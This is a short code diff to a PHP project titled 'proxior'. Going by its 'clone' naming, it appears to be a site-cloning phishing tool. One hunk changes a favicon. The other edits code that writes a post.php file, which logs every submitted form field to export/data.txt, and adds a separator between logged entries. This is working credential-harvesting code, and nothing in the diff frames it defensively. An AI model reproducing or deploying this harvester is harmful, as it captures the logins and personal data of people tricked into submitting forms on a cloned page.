@@ -102,7 +102,7 @@ error_reporting(E_ALL);
 
    <title> proxior </title>
   
-  <link rel="icon" type="image/jpg" href="/css/clone_title.jpg" />
+  <link rel="icon" type="image/jpg" href="/css/icons/dns2.png" />
 
  <link rel="stylesheet" type="text/css" href="css/index.css">
  
@@ -348,6 +348,7 @@ usleep(3000000);
     $post_file_php = fopen("post.php", "w") or die("Unable to open file!");
     $lines_php = '<?php $file = "export/data.txt";' .PHP_EOL
       .'file_put_contents($file, print_r($_POST, true), FILE_APPEND);' .PHP_EOL
+      . 'file_put_contents($file, print_r("<hr/>\n", true), FILE_APPEND);' .PHP_EOL
       .'?>'
       .PHP_EOL
       .'<html>
